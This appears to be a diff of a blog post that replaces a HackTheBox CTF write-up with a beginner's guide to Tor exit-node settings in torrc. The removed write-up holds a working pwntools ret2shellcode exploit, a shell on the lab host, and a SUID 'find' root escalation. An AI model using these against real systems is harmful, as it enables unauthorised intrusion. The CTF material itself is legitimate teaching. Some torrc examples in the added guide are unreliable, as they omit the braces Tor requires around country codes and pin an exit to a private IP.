@@ -1,97 +1,96 @@
 ---
 layout: post
-title: "HTB - Babystack: Classic Stack Buffer Overflow Writeup"
-date: 2025-05-03
-last_modified_at: 2025-05-03
-tags: [pwn, buffer-overflow]
-description: "Step-by-step exploitation of a non-PIE, NX-disabled binary on HackTheBox: pattern-offset, ret2shellcode, and shell pop on the remote service."
-image: /assets/images/example-cover.svg
+title: "A Beginner's Guide to Tor Exit Nodes"
+date: 2026-06-15
+last_modified_at: 2026-06-15
+tags: [tor, privacy, networking]
+description: "How Tor exit nodes work, why you might pick a specific country, and exact torrc config snippets for ExitNodes, StrictNodes, and ExcludeExitNodes."
 ---
 
-A textbook stack-overflow box: no PIE, no canary, NX disabled. Perfect for revisiting the fundamentals end-to-end.
+Tor routes traffic through multiple relays to hide your IP. The exit node is the last relay—where your traffic leaves Tor and hits the public internet. You can force Tor to use exits in a specific country (or block certain countries) by editing the `torrc` file.
 
-![Disassembly of the vulnerable function highlighting the gets call](/assets/images/example-cover.svg)
+## What Tor Actually Does
 
-## Enumeration
+Tor (The Onion Router) is a decentralized network of volunteer relays. Each relay encrypts your traffic and peels off a layer like an onion before forwarding it. The final relay—the **exit node**—delivers your request to the destination site.
 
-`checksec` tells us nearly everything:
+Tor Browser is the ready-to-use package: it automatically sends all traffic through Tor, hides your IP, and blocks many tracking methods.
 
-```bash
-$ checksec --file=./babystack
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX disabled
-PIE:      No PIE (0x400000)
-```
+## Why Exit Nodes Matter
 
-Disassembling `vuln()` shows a 64-byte buffer fed to `gets()` — unbounded read, classic.
+Exit nodes don't see your real IP, but they **can see the destination site** and the unencrypted contents of your traffic (unless the site uses HTTPS). Tor picks exits randomly by default, but you may want to control them for:
 
-```text
-0x0040118a    sub    rsp, 0x40
-0x0040118e    lea    rax, [rbp-0x40]
-0x00401192    mov    rdi, rax
-0x00401195    call   gets
-```
+- **Testing**: Check how a site behaves from a specific country  
+- **Research**: Access region-restricted content  
+- **Content access**: Ensure traffic exits in a certain location  
 
-### Finding the offset
+## Edit torrc to Control Exits
 
-```bash
-$ cyclic 200 | ./babystack
-Segmentation fault (core dumped)
-$ cyclic -l 0x6161616c
-72
-```
+Find your `torrc` file:
 
-So 72 bytes to overwrite the saved RIP.
+- **Windows**: `C:\Users\<YourUsername>\AppData\Roaming\Tor\torrc`  
+- **macOS/Linux**: `/etc/tor/torrc` or `~/.tor/torrc`  
 
-## Exploitation
+Open it and add the lines below.
 
-With NX off, we can drop shellcode on the stack and jump straight to it. `objdump` gives us a `jmp rsp` gadget at `0x0040121a`.
-
-```python
-from pwn import *
-
-context.binary = elf = ELF("./babystack")
-context.arch = "amd64"
-
-JMP_RSP = 0x0040121a
-shellcode = asm(shellcraft.sh())
-
-payload  = b"A" * 72
-payload += p64(JMP_RSP)
-payload += shellcode
-
-io = remote("10.10.10.42", 1337)
-io.sendlineafter(b"name?", payload)
-io.interactive()
-```
-
-Run it:
+### Pick a country
 
 ```text
-$ python3 exploit.py
-[+] Opening connection to 10.10.10.42 on port 1337: Done
-[*] Switching to interactive mode
-$ id
-uid=1000(babystack) gid=1000(babystack)
-$ cat flag.txt
-HTB{r3t_t0_sh3llc0de_n3v3r_g3ts_0ld}
+ExitNodes ua
+StrictNodes 1
 ```
 
-## Privilege Escalation
+- Replace `ua` with a country code: `us` (USA), `fr` (France), `de` (Germany), etc.  
+- `StrictNodes 1` forces Tor to **only** use exits in that country.  
+- Set `StrictNodes 0` if you want Tor to prefer that country but allow others if needed.
 
-The `babystack` user owns a SUID copy of `find` — trivial root via:
+### Use multiple countries
 
-```bash
-$ find . -exec /bin/sh -p \; -quit
-# id
-uid=0(root) gid=0(root)
-# cat /root/root.txt
-HTB{suid_find_classic}
+```text
+ExitNodes us,de,fr
+StrictNodes 0
 ```
 
-## Takeaways
+Tor will prioritize exits in the US, Germany, and France, but can fall back to others.
 
-- Always run `checksec` first; it dictates strategy.
-- `jmp rsp` (or any controlled register) makes shellcode placement trivial when NX is off.
-- SUID binaries from GTFOBins are still everywhere in CTF land.
+### Pin by IP address (optional)
+
+```text
+ExitNodes 192.168.1.1
+StrictNodes 1
+```
+
+Replace with the actual exit node IP you want.
+
+## Blacklist countries or nodes
+
+### Block as exit nodes only
+
+```text
+ExcludeExitNodes ru,cn
+```
+
+Tor won't use Russia or China as exits, but can still use them as entry/middle relays.
+
+### Block from the entire circuit
+
+```text
+ExcludeNodes ru,cn
+```
+
+This prevents Tor from using those countries at any position (entry, middle, or exit).
+
+## Quick reference
+
+| Setting              | Effect                                                                 |
+|----------------------|------------------------------------------------------------------------|
+| `ExitNodes us`       | Prefer US exits                                                        |
+| `StrictNodes 1`      | Only use specified exits/countries                                     |
+| `StrictNodes 0`      | Prefer specified exits, but allow others                               |
+| `ExcludeExitNodes ru,cn` | Do not use Russia/China as exits                                    |
+| `ExcludeNodes ru,cn`     | Do not use Russia/China anywhere in the circuit                     |
+
+## References
+
+- Tor Project Documentation — official config guide  
+- Tor Network Overview — how relays and circuits work  
+- Country codes list — ISO-2 codes for `ExitNodes`/`ExcludeExitNodes`
